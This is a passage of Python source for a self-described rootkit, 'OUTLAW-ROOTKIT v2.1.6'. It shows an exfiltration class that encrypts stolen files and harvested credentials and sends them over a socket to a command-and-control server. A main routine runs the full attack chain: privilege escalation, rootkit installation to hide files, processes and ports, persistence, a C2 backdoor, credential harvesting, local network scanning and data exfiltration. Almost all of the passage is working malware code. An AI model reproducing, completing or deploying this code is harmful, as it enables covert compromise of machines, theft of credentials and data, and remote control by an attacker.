            sock.connect((C2.host, C2.port))
            sock.sendall(b"EXFIL:" + os.path.basename(filepath).encode() + b"\n")
            sock.sendall(nonce + tag + ciphertext)
            sock.close()
            return True
        except Exception as e:
            print(f"[EXFIL] Failed to exfil {filepath}: {e}")
            return False

    def exfil_all_credentials(self) -> bool:
        """Exfiltrate all harvested credentials."""
        harvester = CredentialHarvester()
        creds = harvester.harvest_all()
        data = json.dumps(creds).encode()

        key = get_random_bytes(32)
        nonce = get_random_bytes(12)
        cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2.host, C2.port))
            sock.sendall(b"EXFIL:credentials\n")
            sock.sendall(nonce + tag + ciphertext)
            sock.close()
            print("[EXFIL] Credentials exfiltrated successfully")
            return True
        except Exception as e:
            print(f"[EXFIL] Credential exfil failed: {e}")
            return False


# ============================================================
# MAIN EXECUTION FLOW
# ============================================================

def main():
    print("=" * 60)
    print("  OUTLAW-ROOTKIT v2.1.6")
    print(f"  Platform: {platform.platform()}")
    print(f"  Kernel: {KERNEL_VERSION}")
    print(f"  C2 Server: {C2.host}:{C2.port}")
    print("=" * 60)

    # 1. Privilege Escalation
    print("\n[PHASE 1] Privilege Escalation...")
    if escalate_privileges():
        print("[OUTLAW] Root privileges achieved\n")
    else:
        print("[OUTLAW] WARNING: Could not escalate — continuing as current user\n")

    # 2. Rootkit Installation
    print("\n[PHASE 2] Rootkit Installation...")
    rootkit = Rootkit()
    if rootkit.install():
        print("[OUTLAW] Rootkit active — hiding files, processes, ports\n")

    # 3. Persistence
    print("\n[PHASE 3] Persistence Installation...")
    persistence = Persistence(rootkit)
    persistence.install_all()
    print("[OUTLAW] Persistence mechanisms deployed\n")

    # 4. C2 Backdoor
    print("\n[PHASE 4] C2 Backdoor...")
    c2 = C2Backdoor(C2)
    c2.start()
    print("[OUTLAW] C2 backdoor active\n")

    # 5. Credential Harvesting
    print("\n[PHASE 5] Credential Harvesting...")
    harvester = CredentialHarvester()
    creds = harvester.harvest_all()
    for provider, data in creds.items():
        print(f"  [{provider}] {list(data.keys())}")
    print("[OUTLAW] Credentials harvested\n")

    # 6. Network Scanning
    print("\n[PHASE 6] Network Scanning...")
    scanner = NetworkScanner()
    hosts = scanner.scan_local_network()
    print(f"  Found {len(hosts)} live hosts")
    for host in hosts:
        print(f"    {host['ip']} — ports: {host['open_ports']}")
    print("[OUTLAW] Network scan complete\n")

    # 7. Data Exfiltration
    print("\n[PHASE 7] Data Exfiltration...")
    exfiltrator = Exfiltrator()
    exfiltrator.exfil_all_credentials()
    print("[OUTLAW] Data exfiltrated\n")

    # 8. Wait for C2 commands
    print("\n[PHASE 8] Waiting for C2 commands...")
    print("[OUTLAW] Type 'EXIT' to stop\n")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[OUTLAW] Stopping...")
        c2.stop()


if __name__ == "__main__":
    main()
